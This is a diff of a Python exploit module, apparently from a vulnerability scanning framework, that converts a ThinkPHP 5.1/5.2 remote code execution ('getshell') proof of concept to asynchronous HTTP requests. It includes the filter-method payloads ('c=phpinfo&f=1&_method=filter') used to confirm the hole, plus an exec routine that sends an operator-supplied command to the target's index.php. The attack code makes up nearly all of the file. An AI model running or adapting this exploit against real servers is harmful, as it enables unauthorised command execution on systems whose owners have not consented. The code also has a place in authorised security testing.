@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
+from lib.utils.connect import ClientSession
 from urllib import parse
 from script import Script, SERVICE_PORT_MAP
 
@@ -21,8 +22,8 @@ class POC(Script):
         Script.__init__(self, target=target, service_type=self.service_type)
 
 
-    def prove(self):
-        self.get_url()
+    async def prove(self):
+        await self.get_url()
         if self.base_url:
             headers ={}
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
@@ -32,20 +33,22 @@ class POC(Script):
                 self.url_normpath(self.url, './'),
                 self.url_normpath(self.url, './public/'),
             ]))
-            for path in path_list:
-                for poc in ['c=phpinfo&f=1&_method=filter',
-                            'c=var_dump&f=1&_method=filter']:
-                    url =  path + '/index.php'
-                    res = self.curl('post', url, data=poc,headers=headers)
-                    if res != None :
-                        if 'PHP Version' in res.text or 'string(8) "var_dump"' in res.text:
-                            self.flag = 1
-                            self.req.append({"flag": url})
-                            self.res.append({"info": url, "key": "thinkphp 51~52_getshell"})
-                            break
+            async with ClientSession() as session:
+                for path in path_list:
+                    for poc in ['c=phpinfo&f=1&_method=filter',
+                                'c=var_dump&f=1&_method=filter']:
+                        url =  path + '/index.php'
+                        async with session.post(url=url,data=poc,headers=headers) as res:
+                            if res != None :
+                                text = await res.text()
+                                if 'PHP Version' in text or 'string(8) "var_dump"' in text:
+                                    self.flag = 1
+                                    self.req.append({"flag": url})
+                                    self.res.append({"info": url, "key": "thinkphp 51~52_getshell"})
+                                    break
 
-    def exec(self):
-        self.get_url()
+    async def exec(self):
+        await self.get_url()
         cmd = self.parameter['cmd']
         if self.base_url:
             headers ={ }
@@ -57,11 +60,13 @@ class POC(Script):
                 self.url_normpath(self.url, './'),
                 self.url_normpath(self.url, './public/'),
             ]))
-            for path in path_list:
-                for pocpath in ['index.php']:
-                    url = path + pocpath
-                    res = self.curl('post', url, data = poc,headers=headers)
-                    if res != None and res.status_code == 500:
-                        self.flag = 1
-                        self.req.append({"flag": url})
-                        self.res.append({"info": res.text, "key": "thinkphp 51~52_getshell"})
+            async with ClientSession() as session:
+                for path in path_list:
+                    for pocpath in ['index.php']:
+                        url = path + pocpath
+                        async with session.post(url=url, data=poc, headers=headers) as res:
+                            if res != None and res.status == 500:
+                                text = await res.text()
+                                self.flag = 1
+                                self.req.append({"flag": url})
+                                self.res.append({"info": text, "key": "thinkphp 51~52_getshell"})
